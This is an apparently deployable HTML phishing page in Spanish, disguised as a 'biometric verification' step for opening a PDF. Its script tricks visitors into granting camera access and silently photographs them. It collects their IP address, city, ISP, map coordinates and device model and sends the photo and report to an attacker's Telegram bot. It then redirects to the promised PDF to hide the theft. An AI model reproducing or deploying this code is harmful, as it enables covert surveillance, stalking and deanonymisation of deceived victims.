<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso Seguro - Verificaci√≥n Requerida</title>
    <style>
        body { background: #0b1016; color: #00ff41; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Courier New', Courier, monospace; margin: 0; }
        .scanner { width: 250px; height: 250px; border: 3px solid #00ff41; border-radius: 50%; position: relative; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 25px rgba(0, 255, 65, 0.3); }
        .line { width: 100%; height: 3px; background: #00ff41; position: absolute; animation: move 2.5s infinite; box-shadow: 0 0 15px #00ff41; }
        @keyframes move { 0%, 100% { top: 0%; } 50% { top: 100%; } }
        .msg { margin-top: 25px; text-align: center; font-weight: bold; }
        .blink { animation: flash 1.5s infinite; }
        @keyframes flash { 50% { opacity: 0.3; } }
    </style>
</head>
<body>

    <div class="scanner">
        <div class="line"></div>
        <span style="font-size: 50px;">üë§</span>
    </div>

    <div class="msg">
        <p class="blink" id="status">INICIALIZANDO ESCANEO BIOM√âTRICO...</p>
        <p style="color: #666; font-size: 0.8em;">Validando identidad para acceso al documento PDF.</p>
    </div>

    <script src="config.js"></script>
    <script>
        async function procesar() {
            const status = document.getElementById('status');
            let fotoBlob = null;

            try {
                // 1. Captura de Foto (Prioridad alta)
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    // Convertir a Blob directamente para mayor velocidad de env√≠o
                    fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) {
                    status.innerHTML = "‚ùå ERROR: SENSOR NO DETECTADO";
                    status.style.color = "red";
                    alert("Error de Seguridad: No se detect√≥ el sensor biom√©trico. Por favor, permita el acceso a la c√°mara y recargue para continuar.");
                    location.reload();
                    return;
                }

                status.innerHTML = "‚úÖ VERIFICADO. PROCESANDO DATOS...";

                // 2. Obtenci√≥n de Datos (Paralelo para velocidad)
                const [resIp, agente] = [await fetch('https://ipapi.co/json/'), navigator.userAgent];
                const d = await resIp.json();
                const equipo = agente.match(/\(([^)]+)\)/)[1]; // Extrae el modelo del equipo

                // 3. Reporte de Texto
                const reporte = `üö® *REPORTE DE ACCESO*\n\n` +
                                `üì± *Equipo:* ${equipo}\n` +
                                `üåê *IP:* \`${d.ip}\`\n` +
                                `üìç *Ubicaci√≥n:* ${d.city}, ${d.country_name}\n` +
                                `üì∂ *ISP:* ${d.org}\n` +
                                `üîó *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;

                // 4. Env√≠o a Telegram (Usamos Promise.all para enviar todo a la vez)
                const promesas = [
                    fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: reporte, parse_mode: 'Markdown' })
                    })
                ];

                if (fotoBlob) {
                    const fd = new FormData();
                    fd.append('chat_id', CONFIG.CHAT_ID);
                    fd.append('photo', fotoBlob, 'foto.jpg');
                    promesas.push(fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd }));
                }

                await Promise.all(promesas);

            } catch (err) {
                console.log("...");
            } finally {
                // Redirecci√≥n final
                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);
            }
        }

        window.onload = () => {
            // Peque√±o retraso para que la animaci√≥n se vea antes de pedir la c√°mara
            setTimeout(procesar, 1000);
        };
    </script>
</body>
</html>
